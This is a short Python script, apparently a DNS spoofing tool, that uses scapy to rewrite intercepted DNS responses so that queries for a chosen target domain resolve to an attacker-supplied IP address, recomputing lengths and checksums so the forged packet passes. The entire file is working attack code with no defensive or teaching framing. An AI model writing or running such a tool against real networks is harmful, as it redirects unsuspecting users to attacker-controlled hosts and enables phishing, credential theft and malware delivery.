from scapy.all import IP, DNS, DNSQR, DNSRR
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR

def process_packet(target_domain, spoof_ip, payload) -> bytes:
    scapy_packet = IP(bytes(payload))
    if scapy_packet.haslayer(DNSRR):
        q_name = scapy_packet[DNSQR].qname.decode("utf-8")
        print("[*] DNS request for {}".format(q_name))
        if target_domain in q_name:
            print("[+] Spoofing DNS Request for {} to {}".format(q_name, spoof_ip))

            answer = DNSRR(rrname=q_name, rdata=spoof_ip)
            scapy_packet[DNS].an = answer
            scapy_packet[DNS].ancount = 1

            del scapy_packet[IP].len
            del scapy_packet[IP].chksum

            if scapy_packet.haslayer(UDP):
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum

            return bytes(scapy_packet)
    
    return []
